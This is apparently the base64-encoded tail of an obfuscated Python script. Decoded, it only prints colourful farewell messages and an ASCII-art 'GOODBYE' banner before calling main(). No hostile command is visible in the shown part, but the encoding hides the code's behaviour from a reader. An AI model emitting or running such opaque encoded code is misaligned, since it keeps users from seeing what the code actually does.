Rm9yZSAuTElHSFRHUkVFTl9FWCArIiIiXG50aGFua3MgZm9yIHlvdXIgdGltZSBicm8gKOKWgMy/xLnMr+KWgMy/IMy/KSAiIiIrRm9yZSAuUkVEICsiIiIKa2VlcCBpdCB1cCBjYXVzZSB5b3VyIEZpcmUiIiIpI2xpbmU6MjY3CiAgICBzbGVlcCAoMSApI2xpbmU6MjY4CiAgICBwcmludCAoRm9yZSAuUkVEICsiIiIK4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paR4oCD4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KAg+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKWiOKWiOKVl+KWkeKWiOKWiOKVlOKVneKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnQrilojilojilZHilpHilpHilojilojilZfilpHilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilpHilojilojilZHigIPilojilojilojilojilojilojilabilZ3ilpHilZrilojilojilojilojilZTilZ3ilpHilojilojilojilojilojilZfilpHilpEK4paI4paI4pWR4paR4paR4pWa4paI4paI4pWX4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paI4paI4pWR4oCD4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paR4paR4pWa4paI4paI4pWU4pWd4paR4paR4paI4paI4pWU4pWQ4pWQ4pWd4paR4paRCuKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKAg+KWiOKWiOKWiOKWiOKWiOKWiOKVpuKVneKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilpHilZrilZDilZDilZDilZDilZ3ilpHilpHilZrilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHigIPilZrilZDilZDilZDilZDilZDilZ3ilpHilpHilpHilpHilZrilZDilZ3ilpHilpHilpHilZrilZDilZDilZDilZDilZDilZDilZ0iIiIpI2xpbmU6Mjc1Cm1haW4gKCk='))